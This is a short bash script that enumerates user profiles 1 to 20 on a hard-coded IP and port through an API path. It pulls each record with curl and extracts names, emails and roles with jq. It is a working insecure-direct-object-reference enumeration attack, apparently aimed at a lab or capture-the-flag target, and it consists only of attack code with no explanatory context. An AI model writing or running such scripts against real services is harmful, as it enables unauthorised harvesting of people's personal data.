#!/bin/bash

# Correct base URL and port
base="http://83.136.249.246:36572/profile/api.php/profile/"

for id in {1..20}; do
  url="${base}${id}"
  echo "[*] Fetching profile $id: $url"

  json=$(curl -s "$url")

  # Only try to parse if looks like JSON object
  if [[ "$json" =~ ^\{.*\}$ ]]; then
    echo "$json" | jq -r '
      "UID: \(.uid)
Name: \(.full_name)
Email: \(.email)
Role: \(.role)
About: \(.about)
-----"
    '
  else
    echo "[-] No valid JSON or profile not found for id=$id"
    echo "Raw output: $json"
  fi
done
